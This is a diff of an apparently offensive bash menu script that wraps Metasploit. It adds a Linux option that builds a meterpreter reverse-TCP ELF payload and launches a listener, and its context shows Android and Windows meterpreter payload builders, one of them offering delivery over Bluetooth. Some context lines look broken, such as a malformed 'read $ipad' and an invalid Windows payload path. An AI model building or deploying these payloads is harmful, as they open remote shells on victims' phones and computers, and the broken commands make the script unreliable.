@@ -32,6 +32,7 @@ echo "7. Bluetooth scanning (seventh)"
 echo "8. Network discovery (eight)"
 echo "9. Search For exploit (ninth)"
 echo "10.Download wordlist or make your own"
+echo "11. Linux exploit (eleventh)"
 echo "100.exit"
 read f
 if [[ "$f" == 'first' || "$f" == '1' || "$f" == 'android'  ]];
@@ -62,6 +63,7 @@ if [[ "$f" == 'first' || "$f" == '1' || "$f" == 'android'  ]];
   read ip
   echo "app name:"
   read name 
+    echo "please wait... "
     msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=556 R> $name
     echo "do you want to send the payload via bluethooth? (y/n) "
     read bt
@@ -140,6 +142,7 @@ if [[ "$f" == '5' || "$f" == 'fifth' || "$f" == 'vnc' || "$f" == 'win' ]];
 then
 echo "ip address: "
 read $ipad
+echo "please wait..."
 msfvenom -p exploit/windows/meterpreter/reverse_tcp lhost= $ipad lport=24 x>vnc.exe
 msfconsole -r win_vnc.rc
 fi
@@ -205,9 +208,22 @@ read minimum
 echo "please enter a maximum:"
 read max
 crunch $minimum $max
-
-
 fi
+
+if [[ $f  == "11" || $f == "eleventh" || $f == "linux" ]]
+then
+echo "Please enter your payload name: "
+read lpay
+echo "please enter your ip address"
+read ipl
+echo "please enter your port for the payload "
+read pl
+echo "please wait..."
+msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=$ipl lport=$pl -f elf > $lpay.elf
+msfconsole -r linux.rc
+fi
+
+
 if [[ $f == "100" || $f == "exit" ]]
 then 
 on=0
